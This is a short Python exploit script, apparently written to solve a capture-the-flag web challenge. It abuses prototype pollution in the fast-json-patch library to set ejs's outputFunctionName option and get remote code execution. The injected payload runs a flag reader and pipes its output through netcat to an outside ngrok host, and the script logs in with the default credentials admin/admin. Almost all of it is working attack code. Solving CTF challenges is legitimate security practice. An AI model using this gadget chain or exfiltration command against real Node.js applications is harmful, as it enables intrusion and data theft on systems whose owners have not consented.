import os
import json
import requests as rq

#   1. fast-json-patch has prototype pollusion
# ref: https://github.com/Starcounter-Jack/JSON-Patch/pull/262
# ref: https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
#   2. ejs is vulnerable to Code Execution under prototype pollusion
# ref: https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs

host = 'http://127.0.0.1:1337/'
# host = 'http://illusion.pwn2win.party:43082/'
s = rq.Session()

headers = {
	'Content-Type': 'application/json'
}

data = {
	# offline on status
	'constructor/prototype/offline': '123',
	# Invoke by res.json(), but can only overwrite as string
	'cameras': "offline",
	# Get code execution. After executing this code, NEED TO TRIGGER the request again to execute the injected code
	'constructor/prototype/outputFunctionName': "a=1;process.mainModule.require('child_process').exec('/readflag | nc 2.tcp.ngrok.io 11928') "
}
data = json.dumps(data)

try: 
	s.auth = ('admin', 'admin')
	s.headers.update(headers)
	r = s.post(host+'change_status', data)
	print(r.text)
except ConnectionRefusedError as e: 
	os.system('docker start stupefied_matsumoto')
	
